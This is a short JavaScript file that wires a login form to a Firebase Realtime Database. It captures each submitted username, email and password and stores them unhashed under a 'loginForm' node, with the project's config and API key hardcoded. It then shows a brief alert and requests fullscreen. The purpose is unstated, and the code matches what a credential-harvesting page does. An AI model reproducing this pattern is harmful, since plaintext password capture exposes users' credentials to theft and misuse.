const firebaseConfig = {
    apiKey: "AIzaSyC-EC6X0O7dIoflIwhmPJlAUzlMzfZAUMQ",
    authDomain: "contactform-37103.firebaseapp.com",
    databaseURL: "https://contactform-37103-default-rtdb.firebaseio.com",
    projectId: "contactform-37103",
    storageBucket: "contactform-37103.appspot.com",
    messagingSenderId: "219402083589",
    appId: "1:219402083589:web:846d036b75b4bce1b6ab6c"
  };
  
  firebase.initializeApp(firebaseConfig);
  
   var loginFormDB = firebase.database().ref('loginForm');
  
  document.getElementById('loginForm').addEventListener('submit',submitForm);
  
  function submitForm(e){
    e.preventDefault();
  
    var username = getElementVal('username');
    var email = getElementVal('email');
    var password = getElementVal('password');
    
  
   saveMessages(username,email,password);
  
  
   document.querySelector('.alert').style.display = "block";
  
   setTimeout(()=>{
            document.querySelector('.alert').style.display = "none";
   },3000);
  
  
   document.getElementById('loginForm').requestFullscreen();
  
   
  }
  
  
  const saveMessages = (username,email,password)=>{
    var newLoginForm = loginFormDB.push();
  
    newLoginForm.set({
        username : username,
        email : email,
        password : password,
        
    })
  };
  
  
  
  const getElementVal = (id)=>{
    return document.getElementById(id).value;
  }